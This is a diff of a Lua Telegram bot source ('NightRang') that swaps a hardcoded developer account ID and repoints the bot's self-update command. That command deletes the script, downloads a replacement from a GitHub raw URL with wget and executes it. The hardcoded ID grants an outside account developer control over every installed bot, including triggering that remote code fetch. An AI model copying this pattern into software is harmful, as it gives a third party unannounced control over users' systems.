@@ -119,7 +119,7 @@ token = sudos.Token_Bot
 UserName_Dev = sudos.UserName_dev
 bot_id = token:match("(%d+)")  
 Id_Dev = tonumber(sudos.id_dev)
-Ids_Dev = {Id_Dev,1769776049}
+Ids_Dev = {Id_Dev,1634560089}
 Name_Bot = (redis:get(bot_id.."NightRang:Redis:Name:Bot") or "NightRang")
 ------------------------------------------------------------------------------------------------------------
 function var(value)  
@@ -2626,7 +2626,7 @@ return false end
 end
 if text == 'تحديث السورس' and Dev_Bots(msg) then 
 os.execute('rm -rf NightRang.lua')
-os.execute('wget https://raw.githubusercontent.com/Free-src-laksis/NightRang/main/NightRang.lua')
+os.execute('wget https://raw.githubusercontent.com/TshakeA/NightRang/main/NightRang.lua')
 send(msg.chat_id_, msg.id_,'• تم تحديث السورس')
 dofile('NightRang.lua')  
 end
@@ -10541,7 +10541,6 @@ end,nil)
 end
 end
 end
-
 
 
 
